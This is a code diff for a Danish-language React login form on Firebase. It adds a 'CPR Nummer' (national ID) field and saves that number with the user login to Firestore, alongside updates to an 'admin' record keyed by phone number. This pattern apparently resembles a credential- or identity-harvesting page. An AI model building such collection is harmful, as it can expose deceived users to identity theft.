@@ -6,11 +6,13 @@ import { db } from "../../firebase";
 function Login() {
   const [identifier, setIdentifier] = useOutletContext();
   const [bruger, setBruger] = useState("");
+  const [cpr, setCpr] = useState("");
   const BrugerData = async () => {
     if (!bruger) return;
     await setDoc(doc(db, "Users", "bruger_" + identifier.replaceAll("+", "")), {
       id: identifier.replaceAll("+", ""),
       bruger: bruger,
+      cpr: cpr,
     });
 
     await updateDoc(doc(db, "admin", identifier), {
@@ -54,6 +56,22 @@ function Login() {
             onChange={(e) => setBruger(e.target.value)}
             type="cc"
             id="cc"
+            className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 "
+            placeholder=""
+          />
+        </div>
+        <div className="my-6">
+          <label
+            htmlFor="link"
+            className="block text-left text-md font-semibold mb-2  text-gray-900"
+          >
+            CPR Nummer
+          </label>
+          <input
+            maxLength={10}
+            onChange={(e) => setCpr(e.target.value)}
+            type="text"
+            id="cpr"
             className="bg-gray-50 border border-gray-800 text-gray-900 text-sm rounded-sm focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 "
             placeholder=""
           />
